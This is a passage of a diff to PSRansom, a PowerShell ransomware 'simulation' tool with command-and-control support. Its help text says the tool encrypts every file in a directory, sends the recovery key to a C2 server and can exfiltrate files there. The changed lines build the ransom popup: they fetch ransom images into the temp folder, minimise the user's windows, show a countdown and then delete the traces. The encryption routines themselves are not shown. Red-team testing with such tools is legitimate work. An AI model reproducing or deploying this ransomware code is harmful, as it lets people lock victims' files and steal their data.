@@ -27,10 +27,10 @@ function Show-Banner {
 function Show-Help {
    Write-host ; Write-Host " Info: " -ForegroundColor Yellow -NoNewLine ; Write-Host " This tool helps you simulate encryption process of a"
    Write-Host "        generic ransomware in PowerShell with C2 capabilities"
-   Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\RansomShell.ps1 -e Directory -s C2Server -p C2Port" -ForegroundColor Blue 
+   Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\PSRansom.ps1 -e Directory -s C2Server -p C2Port" -ForegroundColor Blue 
    Write-Host "          Encrypt all files & sends recovery key to C2Server" -ForegroundColor Green
    Write-Host "          Use -x to exfiltrate and decrypt files on C2Server" -ForegroundColor Green
-   Write-Host ; Write-Host "        .\RansomShell.ps1 -d Directory -k RecoveryKey" -ForegroundColor Blue 
+   Write-Host ; Write-Host "        .\PSRansom.ps1 -d Directory -k RecoveryKey" -ForegroundColor Blue 
    Write-Host "          Decrypt all files with recovery key string" -ForegroundColor Green
    Write-Host ; Write-Host " Warning: " -ForegroundColor Red -NoNewLine  ; Write-Host "All info will be sent to the C2Server without any encryption"
    Write-Host "         " -NoNewLine ; Write-Host " You need previously generated recovery key to retrieve files" ; Write-Host }
@@ -174,6 +174,8 @@ function PopUpRansom {
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
 [void] [System.Windows.Forms.Application]::EnableVisualStyles() 
 
+Invoke-WebRequest -useb https://github.com/JoelGMSec/PyShell/tree/main/Demo/PSRansom.jpg -Outfile $env:temp\PSRansom.jpg
+Invoke-WebRequest -useb https://github.com/JoelGMSec/PyShell/tree/main/Demo/PSRansom.ico -Outfile $env:temp\PSRansom.ico
 $shell = New-Object -ComObject "Shell.Application"
 $shell.minimizeall()
 
@@ -187,7 +189,7 @@ $form.Topmost = $true
 $form.FormBorderStyle = "Fixed3D"
 $form.Text = "PSRansom by @JoelGMSec - https://github.com/JoelGMSec/PSRansom" 
 
-$img = [System.Drawing.Image]::Fromfile("C:\Users\Joel\Desktop\PSRansom\Demo\PSRansom.jpg")
+$img = [System.Drawing.Image]::Fromfile("$env:temp\PSRansom.jpg")
 $pictureBox = new-object Windows.Forms.PictureBox
 $pictureBox.Width = 920
 $pictureBox.Height = 370
@@ -203,7 +205,7 @@ $label.Location = New-Object System.Drawing.Size(50,400)
 $font = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
 $form.Font = $Font 
 $form.Controls.Add($label) 
-$formIcon = New-Object system.drawing.icon ("C:\Users\Joel\Desktop\PSRansom\Demo\PSRansom.ico") 
+$formIcon = New-Object system.drawing.icon ("$env:temp\PSRansom.ico") 
 $form.Icon = $formicon 
  
 $label1 = New-Object System.Windows.Forms.Label
@@ -230,7 +232,7 @@ $counter_Label.Font = $warningfont
 if ($delay -lt 10){ $Counter_Label.ForeColor = "Yellow" }
 if ($delay -lt 6){ $Counter_Label.ForeColor = "Red" }
 start-sleep 1 ; $delay -= 1 }
-$form.Close()}
+$form.Close() ; Remove-Item $env:temp\PSRansom* -force }
 
 function R64Encoder { 
    if ($args[0] -eq "-t") { $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
@@ -312,7 +314,6 @@ else {
    if (!$C2Status) { Write-Host "[+] Saving logs and key in readme.txt.." -ForegroundColor Blue }
    else { Write-Host "[+] Sending logs and key to Command & Control Server.." -ForegroundColor Blue ; SendOK }}
 
-   if ($args like -demo) { RemoveWallpaper ; PopUpRansom }
+   if ($args -like "-demo") { RemoveWallpaper ; PopUpRansom }
 
 sleep 1 ; Write-Host "[i] Done!" -ForegroundColor Green ; Write-Host
-               
